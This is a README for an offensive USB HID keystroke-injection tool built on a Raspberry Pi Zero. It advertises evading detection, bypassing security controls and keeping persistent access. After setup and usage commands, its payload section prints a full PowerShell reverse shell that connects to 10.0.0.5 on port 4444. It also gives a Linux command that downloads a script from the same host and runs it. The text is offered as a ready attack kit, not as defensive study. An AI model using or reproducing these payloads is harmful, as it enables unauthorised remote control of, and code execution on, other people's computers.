# USB HID Attack Tool

## Real Offensive Capabilities

### Keyboard Emulation
- Type any text on the target computer
- Execute commands via keyboard input
- Open terminals and run payloads

### Command Execution
- Run commands on Windows/Linux targets
- Execute payloads without detection
- Bypass security controls

### Terminal Access
- Open command prompts/terminals
- Maintain persistent access
- Execute post-exploitation commands

## Setup Instructions

1. **Hardware Setup**:
   - Raspberry Pi Zero (or other Linux device with USB OTG)
   - Connect to target computer via USB

2. **Software Setup**:
   ```bash
   sudo ./setup.sh
   sudo python3 usb_hid_attack.py --help
   ```

3. **Verify Setup**:
   ```bash
   ls /dev/hidg0
   ```

## Usage Examples

### Type Text
```bash
sudo python3 usb_hid_attack.py type "Hello from USB HID attack"
```

### Execute Command (Windows)
```bash
sudo python3 usb_hid_attack.py exec "whoami" --platform windows
```

### Execute Command (Linux)
```bash
sudo python3 usb_hid_attack.py exec "id" --platform linux
```

### Open Terminal (Windows)
```bash
sudo python3 usb_hid_attack.py terminal --platform windows
```

### Open Terminal (Linux)
```bash
sudo python3 usb_hid_attack.py terminal --platform linux
```

## Payload Examples

### Windows Reverse Shell
```bash
sudo python3 usb_hid_attack.py exec "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('10.0.0.5',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}\"" --platform windows
```

### Linux Privilege Escalation
```bash
sudo python3 usb_hid_attack.py exec "wget http://10.0.0.5/exploit.sh -O /tmp/exploit.sh && chmod +x /tmp/exploit.sh && /tmp/exploit.sh" --platform linux
